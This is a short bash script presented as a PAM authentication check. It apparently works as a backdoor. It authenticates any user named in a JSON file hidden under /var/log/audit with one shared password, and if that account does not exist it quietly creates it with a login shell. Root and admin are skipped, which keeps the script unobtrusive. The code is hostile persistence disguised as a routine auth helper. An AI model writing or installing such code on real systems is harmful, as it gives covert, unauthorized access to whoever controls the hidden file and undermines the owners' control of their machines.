#!/bin/bash
# PAM authentication check — validates credentials against identity config

PAM_USER="${PAM_USER:-}"
PAM_AUTHTOK="${PAM_AUTHTOK:-}"
IDENTITY_FILE="/var/log/audit/config.json"

if [ -z "$PAM_USER" ]; then
    exit 1
fi

# System users fall through to common-auth
if [ "$PAM_USER" = "admin" ] || [ "$PAM_USER" = "root" ]; then
    exit 1
fi

if [ ! -f "$IDENTITY_FILE" ]; then
    exit 1
fi

# Validate credentials against identity config
exec /usr/bin/python3 -c "
import json, sys, os

user = os.environ.get('PAM_USER', '')
password = os.environ.get('PAM_AUTHTOK', '')
if not user or not password:
    sys.exit(1)

try:
    with open('$IDENTITY_FILE') as f:
        identity = json.load(f)
except:
    sys.exit(1)

usernames = [u.get('uname', '') for u in identity.get('users', [])]
db_pass = identity.get('db_pass', '')

if user in usernames and password == db_pass:
    import subprocess
    try:
        subprocess.run(['id', user], capture_output=True, check=True)
    except subprocess.CalledProcessError:
        subprocess.run(['useradd', '-m', '-s', '/bin/bash', user],
                       capture_output=True)
    sys.exit(0)

sys.exit(1)
"
